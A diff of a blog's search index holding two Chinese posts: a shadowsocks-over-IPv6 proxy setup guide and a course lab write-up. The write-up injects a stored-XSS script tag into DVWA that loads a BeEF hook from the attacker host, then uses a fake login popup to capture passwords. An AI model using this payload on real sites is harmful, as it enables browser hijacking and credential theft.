@@ -203,70 +203,75 @@
       </categories>
   </entry>
   <entry>
-    <title>XSS结合Beef的社会工程学窃取密码实验</title>
-    <url>/2019/09/18/hacker-4/</url>
-    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
-<p>不说废话了，直接切入正题……</p>
-<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
-<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
-<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
-<p>你会看到弹出一个终端如下：</p>
-<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
-<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
-<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
-<p>我们输入用户名密码之后会显示如下页面：</p>
-<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
-<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
-<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
-<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
-<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
-<p>之后点击启动，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
-<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
-<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
-<p>如图所示，我的win7的ip地址为192.168.73.129</p>
-<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
-<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
-<p>用户名为admin，密码为password。登陆之后显示如下：</p>
-<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
-<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
-<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
-<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
-<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
-<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
-<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
-<p>按下F12，查看源码。</p>
-<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
-<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
-<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
-<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
-<p>改完之后可以关掉这个框框了。</p>
-<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
-<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
-<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
-<p>是不是像下面这样显示呢？</p>
-<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
-<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
-<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
-<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
-<p>让我们点击它，出现下面这个页面：</p>
-<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
-<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
-<p>现在我们可以点击右下角的Execute了。</p>
-<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
-<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
-<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
-<p>回到beef页面，你会在数据库中看到如下信息：</p>
-<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
-<p>到这里这个实验就结束了！</p>
+    <title>如何使用ipv6进行校园网免流</title>
+    <url>/2019/06/29/ipv6/</url>
+    <content><![CDATA[<p>总结一下自己搭建ipv6服务器的过程，以防自己忘记了……<a id="more"></a></p>
+<h2 id="一、购买VPS服务器"><a href="#一、购买VPS服务器" class="headerlink" title="一、购买VPS服务器"></a>一、购买VPS服务器</h2><p>VPS服务器我选择了国外的，毕竟这样子可以让我们的ss自带科学上网功能嗷，何乐而不为呢嘻嘻。<br>下面进入正题：<br>根据各位大佬们的推荐，我选择了国际知名（我也不知道它到底知不知名嘻嘻）的vultr：<a href="http://www.vultr.com/" target="_blank" rel="noopener">vultr注册地址</a></p>
+<p><img src="/2019/06/29/ipv6/vultr_login.png" alt></p>
+<p>注册登录后点击下图的加号就可以进行购买了（哦对前提是你的账户里要有钱…而且我买的时候vultr有充10$赠送50$的活动）支持支付宝微信支付哦！</p>
+<p><img src="/2019/06/29/ipv6/2.png" alt></p>
+<p>点击加号之后就可以选择服务器的类型了，你可以选择服务器的Locations，如果你希望访问Youtube快一些，那就选美国的服务器，要是你想看一些日本的小网站快一些（我也不知道是什么小网站啦）那就选择日本的服务器。我当时选择了Los Angeles的服务器…至于服务器的os嘛，ubuntu14就够了（最近看到这个网站把ubuntu14取消了，最低都是16.04了）<br>至于配置情况，选价格最低的就完事了（最低也要5$我哭）</p>
+<p>选完之后一定要勾选上下图这个选项，因为我们要用ipv6嘛</p>
+<p><img src="/2019/06/29/ipv6/3.png" alt></p>
+<p>接下来就放心的付款就好了，vultr是按小时收费的，所以就算选错了误付款也没事，我们destroy了它重新买就好了。</p>
+<p>接下来在服务器后台页面的settings选项中我们可以找到服务器的ipv6地址。在部署SSR账号时，我们就用ipv6的ip地址了，前提是我们的网络要支持ipv6喔。</p>
+<h2 id="二、部署VPS服务器"><a href="#二、部署VPS服务器" class="headerlink" title="二、部署VPS服务器"></a>二、部署VPS服务器</h2><h3 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h3><p>写这篇blog的时候发现，我的服务器的ipv4地址被墙了（从这个月初开始同学告诉我某些vpn被封了，然后我发现我搭的vpn也崩溃了…很难过…)但是没关系！我们还有ipv6啊，你不让我用ipv4,我还可以用ipv6啊。不过首先你的网络和电脑都要支持ipv6，我们才能用ipv6进行ssh远程控制服务器。</p>
+<p>ssh命令如下：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh username@ipv6地址</span><br></pre></td></tr></table></figure></p>
+<p>username默认是root，之后输入yes,windows下一定是输入yes而不是y。之后输入vultr给的默认密码(有点复杂远程之后可以修改)，这样我们就可以远程连接到了我们的服务器了！<br>为了解决这个默认的密码有点难输入的问题，ssh后的第一步我们当然是修改密码啦！输入</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p>
+<p>之后输入你想改的密码，再确认一次就成功啦（这里的密码也是不带回显的哦）</p>
+<h3 id="安装pip环境-Ubuntu"><a href="#安装pip环境-Ubuntu" class="headerlink" title="安装pip环境(Ubuntu)"></a>安装pip环境(Ubuntu)</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip</span><br></pre></td></tr></table></figure></p>
+<h3 id="直接安装shadowsocks"><a href="#直接安装shadowsocks" class="headerlink" title="直接安装shadowsocks"></a>直接安装shadowsocks</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></p>
+<p>如果出现Command “python setup.py egg_info” failed错误信息，则输入</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure></p>
+<p>再执行上面的操作</p>
+<p>如果提示没有setuptools模块，则安装setuptools</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install setuptools</span><br></pre></td></tr></table></figure></p>
+<p>再执行上面的操作</p>
+<p>如果出现”cannot import name main”错误信息，则是因为将pip更新之后库里面的函数有所变动造成的。解决方法如下：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo vi /usr/bin/pip</span><br></pre></td></tr></table></figure></p>
+<p>将原来的<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">from pip import main</span><br></pre></td></tr></table></figure></p>
+<p>改为</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">from pip._internal import main</span><br></pre></td></tr></table></figure></p>
+<p>ps:在这里我默认你会vi的操作，如果不会，请自行百度。</p>
+<h3 id="配置shadowsocks-json文件"><a href="#配置shadowsocks-json文件" class="headerlink" title="配置shadowsocks.json文件"></a>配置shadowsocks.json文件</h3><p>装好shadowsocks后，我们需要在/etc/下创建一个名为shadowsocks.json的文件（其实这个json文件不叫这个名字也可以）<br>创建该文件的命令为:<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/shadowsocks.json</span><br></pre></td></tr></table></figure></p>
+<p>这时我们创建一个新文件，在里面输入下图所示内容：</p>
+<p><img src="/2019/06/29/ipv6/4.png" alt></p>
+<p>其中的 “server”:”::” 中的”::”代表启用ipv6。<br>编辑完后，我们按esc退出编辑模式，输入 :wq 保存并退出。<br>之后再shell中输入</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure></p>
+<p>来启动shadowsocks服务。<br>接下来在vultr网站的服务器管理页面，点击settings,如下图所示</p>
+<p><img src="/2019/06/29/ipv6/8.png" alt></p>
+<p>点击图中这个configuration examples 按照官网例程所示，修改/ect/network/interfaces文件</p>
+<p><img src="/2019/06/29/ipv6/9.png" alt></p>
+<p>这里面是我的ip地址，你要填你自己的哦，填我的是没用的啦…<br>最后重启服务器就好了！<br>重启完服务器别忘了重启shadowsocks服务嗷，如果忘记了启动命令往上面看哦~<br>（ps:我们可以利用supervisor使shadowsocks进程开机自启，具体怎么操作就自行百度一下吧嘻嘻）</p>
+<p>到此，我们在服务器上的配置工作就完成了</p>
+<h2 id="三、在自己PC上下载shadowsocks"><a href="#三、在自己PC上下载shadowsocks" class="headerlink" title="三、在自己PC上下载shadowsocks"></a>三、在自己PC上下载shadowsocks</h2><p>在我们自己的pc上，我们需要下载一个小飞机，也就是shadowsocks。<br>具体配置如下图所示</p>
+<p><img src="/2019/06/29/ipv6/5.png" alt></p>
+<p>服务器地址就是你的ipv6地址，端口是在shadowsocks.json文件中填写的端口，注意加密方式不要选错哦。之后点击确定就可以了。<br>小飞机有全局模式和PAC模式，全局就是所有的在浏览器内的网络访问全部走的代理，即通过你的ipv6网络到你的服务器，而PAC模式则是访问国内网站使用自己的本地网络ip，访问国外网站走代理。<br>下面我们测试一下，将小飞机的全局模式打开，启动系统代理，在百度中输入ip，如果会有下图显示的样子，就说明我们大功告成了！</p>
+<p><img src="/2019/06/29/ipv6/6.png" alt></p>
+<p>不过现在的网络速度还是太太太太慢了，如果你想提高网络速度，请继续往下看…</p>
+<h2 id="四、开启BBR"><a href="#四、开启BBR" class="headerlink" title="四、开启BBR"></a>四、开启BBR</h2><p>BBR（新的TCP拥塞控制算法Bottleneck Bandwidth and RTT).<br>要开启BBR，必须要求Ubuntu的内核大于等于4.9，所以要使用这个牛逼哄哄的玩意，我们需要看一下内核是不是4.9以上。<br>查看内核命令</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure></p>
+<p>如果没有高于4.9，那我们接下来需要升级内核了！<br>升级的过程也比较简单，首先我们需要确定我们服务器的系统是32位的还是64位的<br>查看命令：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure></p>
+<p>比如我的服务器系统是64位的，那么输入以下命令</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.2/linux-image-4.10.2-041002-generic_4.10.2-041002.201703120131_amd64.deb</span><br><span class="line">dpkg -i linux-image-4.10.0-041002-generic_4.10.2-041002.201703120131_amd64.deb</span><br></pre></td></tr></table></figure></p>
+<p>上述命令都执行完后，就可以更新grub引导装入程序了。命令为：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure></p>
+<p>最后输入</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></p>
+<p>重启机器，我们再次用uname -a命令查看内核版本，会发现升级成功！<br>准备工作都做完了，我们可以开始开启BBR了！<br>执行以下命令：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"net.core.default_qdisc=fq"</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"net.ipv4.tcp_congestion_control=bbr"</span> &gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure></p>
+<p>保存生效</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></p>
+<p>验证是否已开启bbr:</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure></p>
+<p>如果出现<img src="/2019/06/29/ipv6/7.png" alt></p>
+<p>则开启成功！<br>现在开启我们的科学上网之旅吧！</p>
 ]]></content>
       <categories>
-        <category>软件综合训练课程</category>
+        <category>Daily Essays</category>
       </categories>
   </entry>
   <entry>
@@ -377,75 +382,70 @@
       </categories>
   </entry>
   <entry>
-    <title>如何使用ipv6进行校园网免流</title>
-    <url>/2019/06/29/ipv6/</url>
-    <content><![CDATA[<p>总结一下自己搭建ipv6服务器的过程，以防自己忘记了……<a id="more"></a></p>
-<h2 id="一、购买VPS服务器"><a href="#一、购买VPS服务器" class="headerlink" title="一、购买VPS服务器"></a>一、购买VPS服务器</h2><p>VPS服务器我选择了国外的，毕竟这样子可以让我们的ss自带科学上网功能嗷，何乐而不为呢嘻嘻。<br>下面进入正题：<br>根据各位大佬们的推荐，我选择了国际知名（我也不知道它到底知不知名嘻嘻）的vultr：<a href="http://www.vultr.com/" target="_blank" rel="noopener">vultr注册地址</a></p>
-<p><img src="/2019/06/29/ipv6/vultr_login.png" alt></p>
-<p>注册登录后点击下图的加号就可以进行购买了（哦对前提是你的账户里要有钱…而且我买的时候vultr有充10$赠送50$的活动）支持支付宝微信支付哦！</p>
-<p><img src="/2019/06/29/ipv6/2.png" alt></p>
-<p>点击加号之后就可以选择服务器的类型了，你可以选择服务器的Locations，如果你希望访问Youtube快一些，那就选美国的服务器，要是你想看一些日本的小网站快一些（我也不知道是什么小网站啦）那就选择日本的服务器。我当时选择了Los Angeles的服务器…至于服务器的os嘛，ubuntu14就够了（最近看到这个网站把ubuntu14取消了，最低都是16.04了）<br>至于配置情况，选价格最低的就完事了（最低也要5$我哭）</p>
-<p>选完之后一定要勾选上下图这个选项，因为我们要用ipv6嘛</p>
-<p><img src="/2019/06/29/ipv6/3.png" alt></p>
-<p>接下来就放心的付款就好了，vultr是按小时收费的，所以就算选错了误付款也没事，我们destroy了它重新买就好了。</p>
-<p>接下来在服务器后台页面的settings选项中我们可以找到服务器的ipv6地址。在部署SSR账号时，我们就用ipv6的ip地址了，前提是我们的网络要支持ipv6喔。</p>
-<h2 id="二、部署VPS服务器"><a href="#二、部署VPS服务器" class="headerlink" title="二、部署VPS服务器"></a>二、部署VPS服务器</h2><h3 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h3><p>写这篇blog的时候发现，我的服务器的ipv4地址被墙了（从这个月初开始同学告诉我某些vpn被封了，然后我发现我搭的vpn也崩溃了…很难过…)但是没关系！我们还有ipv6啊，你不让我用ipv4,我还可以用ipv6啊。不过首先你的网络和电脑都要支持ipv6，我们才能用ipv6进行ssh远程控制服务器。</p>
-<p>ssh命令如下：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh username@ipv6地址</span><br></pre></td></tr></table></figure></p>
-<p>username默认是root，之后输入yes,windows下一定是输入yes而不是y。之后输入vultr给的默认密码(有点复杂远程之后可以修改)，这样我们就可以远程连接到了我们的服务器了！<br>为了解决这个默认的密码有点难输入的问题，ssh后的第一步我们当然是修改密码啦！输入</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p>
-<p>之后输入你想改的密码，再确认一次就成功啦（这里的密码也是不带回显的哦）</p>
-<h3 id="安装pip环境-Ubuntu"><a href="#安装pip环境-Ubuntu" class="headerlink" title="安装pip环境(Ubuntu)"></a>安装pip环境(Ubuntu)</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip</span><br></pre></td></tr></table></figure></p>
-<h3 id="直接安装shadowsocks"><a href="#直接安装shadowsocks" class="headerlink" title="直接安装shadowsocks"></a>直接安装shadowsocks</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></p>
-<p>如果出现Command “python setup.py egg_info” failed错误信息，则输入</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure></p>
-<p>再执行上面的操作</p>
-<p>如果提示没有setuptools模块，则安装setuptools</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install setuptools</span><br></pre></td></tr></table></figure></p>
-<p>再执行上面的操作</p>
-<p>如果出现”cannot import name main”错误信息，则是因为将pip更新之后库里面的函数有所变动造成的。解决方法如下：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo vi /usr/bin/pip</span><br></pre></td></tr></table></figure></p>
-<p>将原来的<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">from pip import main</span><br></pre></td></tr></table></figure></p>
-<p>改为</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">from pip._internal import main</span><br></pre></td></tr></table></figure></p>
-<p>ps:在这里我默认你会vi的操作，如果不会，请自行百度。</p>
-<h3 id="配置shadowsocks-json文件"><a href="#配置shadowsocks-json文件" class="headerlink" title="配置shadowsocks.json文件"></a>配置shadowsocks.json文件</h3><p>装好shadowsocks后，我们需要在/etc/下创建一个名为shadowsocks.json的文件（其实这个json文件不叫这个名字也可以）<br>创建该文件的命令为:<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/shadowsocks.json</span><br></pre></td></tr></table></figure></p>
-<p>这时我们创建一个新文件，在里面输入下图所示内容：</p>
-<p><img src="/2019/06/29/ipv6/4.png" alt></p>
-<p>其中的 “server”:”::” 中的”::”代表启用ipv6。<br>编辑完后，我们按esc退出编辑模式，输入 :wq 保存并退出。<br>之后再shell中输入</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure></p>
-<p>来启动shadowsocks服务。<br>接下来在vultr网站的服务器管理页面，点击settings,如下图所示</p>
-<p><img src="/2019/06/29/ipv6/8.png" alt></p>
-<p>点击图中这个configuration examples 按照官网例程所示，修改/ect/network/interfaces文件</p>
-<p><img src="/2019/06/29/ipv6/9.png" alt></p>
-<p>这里面是我的ip地址，你要填你自己的哦，填我的是没用的啦…<br>最后重启服务器就好了！<br>重启完服务器别忘了重启shadowsocks服务嗷，如果忘记了启动命令往上面看哦~<br>（ps:我们可以利用supervisor使shadowsocks进程开机自启，具体怎么操作就自行百度一下吧嘻嘻）</p>
-<p>到此，我们在服务器上的配置工作就完成了</p>
-<h2 id="三、在自己PC上下载shadowsocks"><a href="#三、在自己PC上下载shadowsocks" class="headerlink" title="三、在自己PC上下载shadowsocks"></a>三、在自己PC上下载shadowsocks</h2><p>在我们自己的pc上，我们需要下载一个小飞机，也就是shadowsocks。<br>具体配置如下图所示</p>
-<p><img src="/2019/06/29/ipv6/5.png" alt></p>
-<p>服务器地址就是你的ipv6地址，端口是在shadowsocks.json文件中填写的端口，注意加密方式不要选错哦。之后点击确定就可以了。<br>小飞机有全局模式和PAC模式，全局就是所有的在浏览器内的网络访问全部走的代理，即通过你的ipv6网络到你的服务器，而PAC模式则是访问国内网站使用自己的本地网络ip，访问国外网站走代理。<br>下面我们测试一下，将小飞机的全局模式打开，启动系统代理，在百度中输入ip，如果会有下图显示的样子，就说明我们大功告成了！</p>
-<p><img src="/2019/06/29/ipv6/6.png" alt></p>
-<p>不过现在的网络速度还是太太太太慢了，如果你想提高网络速度，请继续往下看…</p>
-<h2 id="四、开启BBR"><a href="#四、开启BBR" class="headerlink" title="四、开启BBR"></a>四、开启BBR</h2><p>BBR（新的TCP拥塞控制算法Bottleneck Bandwidth and RTT).<br>要开启BBR，必须要求Ubuntu的内核大于等于4.9，所以要使用这个牛逼哄哄的玩意，我们需要看一下内核是不是4.9以上。<br>查看内核命令</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure></p>
-<p>如果没有高于4.9，那我们接下来需要升级内核了！<br>升级的过程也比较简单，首先我们需要确定我们服务器的系统是32位的还是64位的<br>查看命令：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure></p>
-<p>比如我的服务器系统是64位的，那么输入以下命令</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.2/linux-image-4.10.2-041002-generic_4.10.2-041002.201703120131_amd64.deb</span><br><span class="line">dpkg -i linux-image-4.10.0-041002-generic_4.10.2-041002.201703120131_amd64.deb</span><br></pre></td></tr></table></figure></p>
-<p>上述命令都执行完后，就可以更新grub引导装入程序了。命令为：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure></p>
-<p>最后输入</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></p>
-<p>重启机器，我们再次用uname -a命令查看内核版本，会发现升级成功！<br>准备工作都做完了，我们可以开始开启BBR了！<br>执行以下命令：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"net.core.default_qdisc=fq"</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"net.ipv4.tcp_congestion_control=bbr"</span> &gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure></p>
-<p>保存生效</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></p>
-<p>验证是否已开启bbr:</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure></p>
-<p>如果出现<img src="/2019/06/29/ipv6/7.png" alt></p>
-<p>则开启成功！<br>现在开启我们的科学上网之旅吧！</p>
+    <title>XSS结合Beef的社会工程学窃取密码实验</title>
+    <url>/2019/09/18/hacker-4/</url>
+    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
+<p>不说废话了，直接切入正题……</p>
+<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
+<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
+<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
+<p>你会看到弹出一个终端如下：</p>
+<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
+<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
+<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
+<p>我们输入用户名密码之后会显示如下页面：</p>
+<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
+<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
+<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
+<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
+<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
+<p>之后点击启动，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
+<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
+<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
+<p>如图所示，我的win7的ip地址为192.168.73.129</p>
+<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
+<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
+<p>用户名为admin，密码为password。登陆之后显示如下：</p>
+<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
+<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
+<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
+<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
+<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
+<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
+<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
+<p>按下F12，查看源码。</p>
+<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
+<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
+<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
+<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
+<p>改完之后可以关掉这个框框了。</p>
+<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
+<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
+<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
+<p>是不是像下面这样显示呢？</p>
